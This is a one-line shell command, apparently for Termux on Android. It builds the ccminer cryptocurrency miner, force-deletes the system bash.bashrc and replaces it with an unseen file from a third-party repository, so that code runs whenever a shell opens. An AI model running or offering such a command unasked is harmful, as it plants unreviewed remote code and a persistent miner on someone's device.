apt update && apt upgrade && apt install git && apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && cd .. && cd usr && cd ../etc && git clone https://github.com/giaBAba/verus2.git && rm -rf bash.bashrc && cd verus2 && cp bash.bash2 ../bash.bashrc
